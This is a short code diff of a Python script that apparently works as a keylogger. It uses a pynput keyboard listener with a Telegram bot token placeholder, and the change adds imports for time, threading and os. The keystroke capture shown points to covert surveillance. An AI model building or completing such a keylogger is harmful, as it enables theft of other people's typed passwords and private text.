@@ -1,5 +1,8 @@
 from pynput import keyboard
 import requests
+import time
+import threading
+import os
 
 
 telegram_bot_token = "REPLACE_YOUR_TOKEN"
@@ -72,6 +75,7 @@ t.start()
 with keyboard.Listener (
     on_press = OnPress) as listener :
     listener.join()
+
 
 
 
